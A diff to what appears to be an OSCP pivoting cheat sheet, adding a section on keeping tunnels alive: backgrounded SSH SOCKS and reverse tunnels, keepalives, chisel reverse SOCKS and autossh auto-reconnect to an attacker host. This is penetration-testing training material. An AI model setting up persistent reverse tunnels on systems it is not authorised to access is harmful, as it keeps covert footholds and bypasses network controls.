@@ -9,7 +9,7 @@
 
 > **🎯 Reach for these first in the OSCP:** **[chisel](#d1--http-tunnelling-with-chisel)** (reverse SOCKS, works even through egress filtering) · **[ssh -D + proxychains](#b2--dynamic--d-socks)** (whole-subnet SOCKS when you have creds) · **[ssh -L](#b1--local--l)** (one-service quick bridge) · **[sshuttle](#b5--sshuttle)** (transparent subnet routing, no proxychains). Everything else is situational.
 
-> **⚡ Quick jump:** [The one decision](#the-one-decision--which-technique) · [SSH -L/-D/-R cheat](#ssh-forwarding-cheat-sheet) · [socat](#a2--socat-port-forward) · [ssh -L](#b1--local--l) · [ssh -D](#b2--dynamic--d-socks) · [ssh -R](#b3--remote--r) · [sshuttle](#b5--sshuttle) · [ssh.exe](#c1--sshexe-windows) · [plink](#c2--plink-windows) · [netsh](#c3--netsh-windows) · [net use](#c4--net-use-reach-another-windows-boxs-shares) · [chisel](#d1--http-tunnelling-with-chisel) · [dnscat2](#d2--dns-tunnelling-with-dnscat2)
+> **⚡ Quick jump:** [The one decision](#the-one-decision--which-technique) · [SSH -L/-D/-R cheat](#ssh-forwarding-cheat-sheet) · [socat](#a2--socat-port-forward) · [ssh -L](#b1--local--l) · [ssh -D](#b2--dynamic--d-socks) · [ssh -R](#b3--remote--r) · [sshuttle](#b5--sshuttle) · [ssh.exe](#c1--sshexe-windows) · [plink](#c2--plink-windows) · [netsh](#c3--netsh-windows) · [net use](#c4--net-use-reach-another-windows-boxs-shares) · [chisel](#d1--http-tunnelling-with-chisel) · [dnscat2](#d2--dns-tunnelling-with-dnscat2) · [keeping tunnels alive](#e--keeping-tunnels-alive)
 
 ---
 
@@ -408,6 +408,57 @@ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
 
 > DNS tunnelling is **slow** (data crammed into DNS labels) — fine for a shell / small port-forward,
 > painful for bulk transfer. The `listen [<lhost>:]<lport> <rhost>:<rport>` syntax mirrors `-L`.
+
+---
+
+# E — Keeping tunnels alive
+
+A tunnel is only as stable as the **process carrying it**. A *forwarded* TCP connection is as reliable
+as any TCP connection — what actually drops is the carrier. In the OSCP the carrier is usually your
+flaky reverse shell, so **the tunnel tech is rarely the weak link; your foothold is.** Robustness
+ranking: **netsh portproxy** (survives reboot) > **chisel** (auto-reconnects) > **socat** > **sshuttle**
+> **ssh -L/-D/-R** (dies with the SSH session) > **dnscat2** (works, but slow/fragile).
+
+**Top ways they die, and the fix:**
+
+| It died because… | Fix |
+|---|---|
+| You started the tunnel **inside a netcat shell** and the shell dropped | Get a stable foothold first (SSH/WinRM); background + detach the tunnel (below) |
+| Ran `ssh` **without `-N` / in foreground**, then exited the shell | Always `ssh -f -N …`; launch from `tmux`/`screen` on Kali |
+| **NAT/firewall idle-timeout** silently killed a quiet tunnel | Keepalives (below) |
+| Pivot process was a **child of the exploited service**; it restarted | Migrate to a stable account/service, or use netsh (survives reboot) |
+| proxychains "hung" | Not dead — just slow/TCP-only. `-sT -Pn`, one proxy line, be patient |
+
+**Background & detach properly** (so closing your shell doesn't take the tunnel):
+
+```bash
+ssh -f -N -D 0.0.0.0:9999 {{USERNAME}}@<DEEP_IP>     # -f self-backgrounds after auth, -N no shell
+nohup ssh -N -R 9998 {{USERNAME}}@{{LHOST}} &        # or nohup + & when -f isn't an option
+disown                                                # detach the job from the current shell
+# best of all: run the whole pivot from a tmux/screen session on Kali so it outlives disconnects
+tmux new -s pivot
+```
+
+**Keepalives** — stop idle NAT/firewall drops (client-side `ssh`, or system-wide in `~/.ssh/config`):
+
+```bash
+ssh -N -D 9999 {{USERNAME}}@<DEEP_IP> \
+    -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes
+chisel client {{LHOST}}:8080 R:socks --keepalive 25s   # chisel's own keepalive
+```
+
+**Auto-reconnect** — for long/unattended pivots that must ride out blips:
+
+```bash
+sudo apt install -y autossh
+# autossh respawns the SSH tunnel automatically if it drops (same -L/-D/-R args as ssh)
+autossh -M 0 -f -N -R 9998 {{USERNAME}}@{{LHOST}} \
+    -o ServerAliveInterval=30 -o ServerAliveCountMax=3
+```
+
+> **chisel** already retries on its own, which is why it's the go-to for anything long-running.
+> **netsh portproxy** persists across reboots (great for durability — but *remember to clean it up*,
+> see §C.3). For quick exam pivots you mostly just need #1 and #2: stable foothold + backgrounded tunnel.
 
 ---
 
